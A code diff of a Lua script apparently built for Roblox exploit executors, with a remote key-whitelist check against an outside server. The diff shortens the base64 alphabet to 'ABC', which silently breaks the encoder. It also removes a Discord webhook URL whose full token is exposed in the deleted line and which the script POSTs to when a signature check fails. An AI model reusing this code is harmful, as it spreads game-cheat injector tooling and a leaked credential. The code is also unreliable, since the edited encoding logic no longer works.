@@ -260,7 +260,7 @@ end
 local URL = 'https://tsuo-script.xyz/'
 local publicKEY1 = 3521
 local publicKEY2 = 16748
-local base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local base64_chars = "ABC"
 
 local REQ = (syn and syn.request) or (identifyexecutor() == 'Fluxus' and request) or http_request or http.request or request
 local HttpService = game:GetService("HttpService")
@@ -379,7 +379,7 @@ local function split(str, sep)
     return result
 end
 
-local base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local base64_chars = "ABC"
 
 local function base64_encode(data)
     return ((data:gsub('.', function(x) 
@@ -510,7 +510,7 @@ local function wl(key)
     if(sign_match ~= decode_response.sign) then
         local rq = http_request or request or HttpPost or syn.request
         local rq2 = rq({
-            Url = "https://discord.com/api/webhooks/1069540588187308043/GHr5nDTMkJu5afm97-ohNpVW7aZqn4nxJAaWeMbPeJ6jtyy2u_1ZoLgxcQ0cZo78wrMf",
+            Url = "",
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
